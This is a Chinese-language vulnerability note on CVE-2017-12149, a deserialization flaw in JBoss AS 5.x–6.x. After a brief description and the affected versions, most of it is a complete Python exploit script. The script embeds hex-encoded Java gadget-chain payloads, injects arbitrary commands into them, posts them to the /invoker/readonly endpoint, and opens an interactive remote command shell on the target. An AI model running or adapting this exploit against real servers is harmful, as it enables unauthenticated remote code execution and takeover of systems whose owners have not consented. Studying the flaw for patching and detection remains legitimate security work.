<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞</h1><h2>一、漏洞简介</h2><p>JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。</p><h2>二、漏洞影响</h2><p>JBoss 5.x - 6.x</p><h2>三、复现过程</h2><h3>poc</h3><p>cve-2017-12149_cmd.py</p><p>#!/usr/bin/python<br />#-*- coding:utf-8 -*-<br /><br />import requests<br />import binascii<br />import sys<br />import re<br /><br />if len(sys.argv)!=2:<br />    print('+---------------------------------------------------------------+')<br />    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub          +')<br />    print('+      as https://github.com/1337g/CVE-2017-10271               +')<br />    print('+---------------------------------------------------------------+')<br />    print('+ USE: python &lt;filename&gt; &lt;url&gt;                                  +')<br />    print('+ EXP: python cve-2017-12149_cmd.py http://freeerror.org:8080   +')<br />    print('+ VER: Jboss AS 5.X                                             +')<br />    print('+      Jboss AS 6.X                                             +')<br />    print('+---------------------------------------------------------------+')<br />    sys.exit()<br />url_in = sys.argv[1]<br /><br />linux_payload_1 =  "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000" \<br />             "7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f" \<br />             "6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279" \<br />             "8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563" \<br />             "743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372" \<br />             "002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170" \<br />             "2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267" \<br />             "2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72" \<br />             "6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374" \<br />             "696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec" \<br />             "287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163" \<br />             "68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78" \<br />             "707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e" \<br />             "732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f" \<br />             "72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f" \<br />             "72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009" \<br />             "69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173" \<br />             "734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63" \<br />             "6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254" \<br />             "72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61" \<br />             "76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176" \<br />             "612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176" \<br />             "612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563" \<br />             "743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43" \<br />             "6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574" \<br />             "2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275" \<br />             "71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00" \<br />             "18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a" \<br />             "fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479" \<br />             "71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74" \<br />             "6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f74" \<br />             "6d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a00" \<br />             "0000017671007e00187371007e00137571007e00180000000174000e52756e436865636b" \<br />             "436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a617661" \<br />             "2e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00" \<br />             "18000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171" \<br />             "007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e" \<br />             "537472696e673badd256e7e91d7b470200007870000000017400"<br />win_payload_1 =  "aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000" \<br />             "7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f" \<br />             "6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279" \<br />             "8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563" \<br />             "743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372" \<br />             "002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170" \<br />             "2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267" \<br />             "2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72" \<br />             "6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374" \<br />             "696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec" \<br />             "287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163" \<br />             "68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78" \<br />             "707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e" \<br />             "732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f" \<br />             "72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f" \<br />             "72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009" \<br />             "69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173" \<br />             "734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63" \<br />             "6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254" \<br />             "72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61" \<br />             "76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176" \<br />             "612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176" \<br />             "612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563" \<br />             "743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43" \<br />             "6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574" \<br />             "2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275" \<br />             "71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00" \<br />             "18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a" \<br />             "fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479" \<br />             "71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74" \<br />             "6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f63" \<br />             "3a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e73" \<br />             "74616e63657571007e001a000000017671007e00187371007e00137571007e0018000000" \<br />             "0174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a" \<br />             "00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078" \<br />             "707371007e00137571007e0018000000017571007e001a0000000171007e003371007e00" \<br />             "1e7571007e001a0000000171007e00207371007e00137571007e00180000000175720013" \<br />             "5b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001" \<br />             "7400"<br />payload_2 =  "71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e48617" \<br />             "3684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573" \<br />             "686f6c6478703f4000000000000077080000001000000000787878"<br /><br />payload_other = ""<br /><br />os_type = "unknown"<br /><br />def build_command_hex(command):<br />    command_exec_hex = "".join("{:02x}".format(ord(c)) for c in command)<br />    command_len = len(command)<br />    command_len_hex = '{:02x}'.format(command_len)<br />    command_hex = command_len_hex + command_exec_hex<br />    return command_hex<br /><br />def build_payload(target_os, command):<br />    global os_type<br />    if os_type == "unknown":<br />        if target_os == "linux":<br />            payload = binascii.unhexlify(linux_payload_1 + build_command_hex(command) + payload_2)<br />        if target_os == "windows":<br />            payload = binascii.unhexlify(win_payload_1 + build_command_hex(command) + payload_2)<br />    if os_type == "linux":<br />        payload = binascii.unhexlify(linux_payload_1 + build_command_hex(command) + payload_2)<br />    if os_type == "windows":<br />        payload = binascii.unhexlify(win_payload_1 + build_command_hex(command) + payload_2)<br />    return payload<br /><br />def do_post(payload):<br />    payload_url = url_in + "/invoker/readonly"<br />    result = requests.post(payload_url, payload, verify=False)<br />    result_content = str(result.content)<br />    return result_content<br /><br />def check_OS():<br />    global os_type<br />    payload_linux = build_payload('linux','whoami')<br />    payload_win = build_payload('windows','whoami')<br />    linux_re = do_post(payload_linux)<br />    win_re = do_post(payload_win)<br />    if  "[L291919]" in linux_re:<br />        os_type = 'linux'<br />    if "[W291013]" in win_re:<br />        os_type = 'windows'<br />    return os_type<br /><br /><br />def run_command(command_in):<br />    payload = build_payload(os_type,command_in)<br />    result = do_post(payload)<br />    result = re.findall ( '](.*?)RunCheckConfig',result, re.DOTALL)<br />    if len(result) == 0:<br />        result.append("command error!\n")<br />    command_callback = result[0]<br />    return command_callback<br /><br />check_OS()<br />if os_type =="unknown":<br />    print "[*] Unknown System"<br />    exit(0)<br /><br />print "***************************************************** \n" \<br />       "*             Target system is  " + os_type + " OS            * \n" \<br />       "***************************************************** \n"<br /><br />while 1:<br />    command_in = raw_input("Shell &gt;&gt;&gt; ")<br />    if command_in == "exit" : exit(0)<br />    print run_command(command_in).decode('utf-8')</p></body></html>